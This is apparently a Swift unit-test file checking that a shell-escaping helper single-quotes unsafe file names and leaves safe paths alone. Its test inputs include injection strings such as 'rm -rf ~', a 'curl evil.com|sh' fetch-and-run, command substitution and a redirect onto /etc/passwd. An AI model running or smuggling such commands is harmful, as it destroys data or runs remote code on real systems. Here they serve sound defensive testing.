import XCTest
@testable import CrispyVibes

final class ShellEscapingTests: XCTestCase {

    // MARK: - Safe strings pass through unquoted

    func testSimpleAlphanumericPassesThrough() {
        XCTAssertEqual(ShellEscaping.singleQuote("readme.txt"), "readme.txt")
    }

    func testPathWithSlashesPassesThrough() {
        XCTAssertEqual(ShellEscaping.singleQuote("/usr/local/bin/git"), "/usr/local/bin/git")
    }

    func testPathWithDotsAndDashesPassesThrough() {
        XCTAssertEqual(ShellEscaping.singleQuote("my-project/src/file.swift"), "my-project/src/file.swift")
    }

    // MARK: - Empty string

    func testEmptyStringReturnsEmptyQuotes() {
        XCTAssertEqual(ShellEscaping.singleQuote(""), "''")
    }

    // MARK: - Spaces are quoted

    func testPathWithSpacesIsQuoted() {
        XCTAssertEqual(ShellEscaping.singleQuote("my project/file.txt"), "'my project/file.txt'")
    }

    // MARK: - Shell metacharacter injection prevention

    func testSemicolonIsQuoted() {
        XCTAssertEqual(ShellEscaping.singleQuote("foo;rm -rf ~"), "'foo;rm -rf ~'")
    }

    func testPipeIsQuoted() {
        XCTAssertEqual(ShellEscaping.singleQuote("foo|curl evil.com"), "'foo|curl evil.com'")
    }

    func testAmpersandIsQuoted() {
        XCTAssertEqual(ShellEscaping.singleQuote("foo&bg"), "'foo&bg'")
    }

    func testBacktickIsQuoted() {
        XCTAssertEqual(ShellEscaping.singleQuote("foo`id`bar"), "'foo`id`bar'")
    }

    func testDollarParenIsQuoted() {
        XCTAssertEqual(ShellEscaping.singleQuote("$(whoami)"), "'$(whoami)'")
    }

    func testRedirectIsQuoted() {
        XCTAssertEqual(ShellEscaping.singleQuote("foo > /etc/passwd"), "'foo > /etc/passwd'")
    }

    func testNewlineIsQuoted() {
        XCTAssertEqual(ShellEscaping.singleQuote("foo\nbar"), "'foo\nbar'")
    }

    // MARK: - Single quote escaping

    func testSingleQuoteInValueIsEscaped() {
        XCTAssertEqual(ShellEscaping.singleQuote("it's"), "'it'\\''s'")
    }

    func testMultipleSingleQuotes() {
        XCTAssertEqual(ShellEscaping.singleQuote("a'b'c"), "'a'\\''b'\\''c'")
    }

    // MARK: - Control characters (Drag-and-Pwnd class)

    func testASCIIControlCharacterSOHIsQuoted() {
        XCTAssertEqual(ShellEscaping.singleQuote("foo\u{01}bar"), "'foo\u{01}bar'")
    }

    func testASCIIControlCharacterETXIsQuoted() {
        XCTAssertEqual(ShellEscaping.singleQuote("foo\u{03}bar"), "'foo\u{03}bar'")
    }

    func testTabIsQuoted() {
        XCTAssertEqual(ShellEscaping.singleQuote("foo\tbar"), "'foo\tbar'")
    }

    // MARK: - Combined attack strings

    func testCombinedInjectionAttempt() {
        let malicious = "file;curl evil.com|sh&"
        let escaped = ShellEscaping.singleQuote(malicious)
        XCTAssertEqual(escaped, "'\(malicious)'")
        XCTAssertTrue(escaped.hasPrefix("'"))
        XCTAssertTrue(escaped.hasSuffix("'"))
    }
}
